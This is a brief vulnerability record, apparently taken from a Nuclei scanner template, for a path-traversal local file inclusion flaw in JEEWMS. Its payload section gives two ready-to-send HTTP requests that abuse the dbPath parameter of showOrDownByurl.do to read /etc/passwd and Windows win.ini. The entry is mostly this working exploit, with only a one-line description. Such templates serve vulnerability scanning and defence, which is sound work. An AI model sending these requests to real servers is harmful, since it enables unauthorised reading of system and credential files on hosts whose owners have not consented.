# Vulnerability: JEEWMS - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`jeewms-lfi.yaml`)

## Description
JEEWMS is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

GET /systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

